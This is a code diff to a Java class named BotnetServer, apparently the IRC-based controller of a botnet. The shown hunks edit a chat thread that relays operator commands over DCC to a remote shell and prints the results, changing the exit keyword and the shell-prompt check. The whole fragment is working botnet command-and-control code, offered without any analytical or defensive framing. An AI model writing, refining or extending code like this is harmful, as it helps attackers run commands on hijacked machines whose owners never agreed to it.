@@ -127,7 +127,7 @@ public class BotnetServer extends PircBot {
 	
 	private class ChatThread extends Thread {
 		private static final String SENTINEL = "$: ";
-		private static final String TERMINATION = "exit";
+		private static final String TERMINATION = "quit shell";
 		DccChat chat;
 		
 		public ChatThread(DccChat chat) {
@@ -151,7 +151,7 @@ public class BotnetServer extends PircBot {
 				while (!command.equalsIgnoreCase(TERMINATION)) {
 					chat.sendLine(command);
 					String response = shellout.nextLine();
-					while (!response.endsWith(SENTINEL)) {
+					while (!response.equals(SENTINEL)) {
 						System.out.println("\t" + response);
 						response = shellout.nextLine();
 					}
